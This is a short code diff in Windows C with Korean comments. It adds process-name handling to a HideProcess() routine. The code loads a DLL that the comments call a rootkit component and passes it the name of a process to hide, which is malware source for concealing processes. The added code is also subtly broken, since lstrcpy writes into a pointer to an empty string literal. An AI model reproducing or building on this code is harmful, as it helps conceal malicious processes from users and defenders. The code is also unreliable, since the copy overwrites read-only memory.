@@ -115,6 +115,8 @@ typedef int (WINAPI* PFMESSAGEBOXA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, 
 // SetWindowTextW()
 typedef BOOL(WINAPI* PFSETWINDOWTEXTW)(HWND hWnd, LPWSTR lpString);
 
+typedef void (*PFN_SETPROCNAME)(LPCTSTR szProcName);
+
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
                      _In_ LPWSTR    lpCmdLine,
@@ -1246,6 +1248,8 @@ BOOL HideProcess()
     BOOL bResult = TRUE;
     int indexMain = -1;
     DWORD dwPID = NULL;  // 은폐할 프로세스의 pid
+    TCHAR *szHideProcName = L"";  // 은폐할 프로세스명
+    PFN_SETPROCNAME pfnSetProcName;
     char szDllPath[MAX_PATH];  // 루트킷 생성 dll의 경로
     HANDLE hSnapshot = NULL;
     PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32 ), };
@@ -1262,6 +1266,10 @@ BOOL HideProcess()
     }
 
     dwPID = arPID[indexMain]; // 은폐할 프로세스의 pid를 셋팅
+    lstrcpy(szHideProcName, arProcName[indexMain]); // 은폐할 프로세스명 셋팅
+
+    pfnSetProcName = (PFN_SETPROCNAME)GetProcAddress(LoadLibraryA(HIDEPROCESSDLL), "SetProcName");
+    pfnSetProcName(szHideProcName);
 
     // 현재 디렉토리에 HideProcess.dll 파일이 존재하는지 체크
     GetCurrentDirectoryA(MAX_PATH, szDllPath);
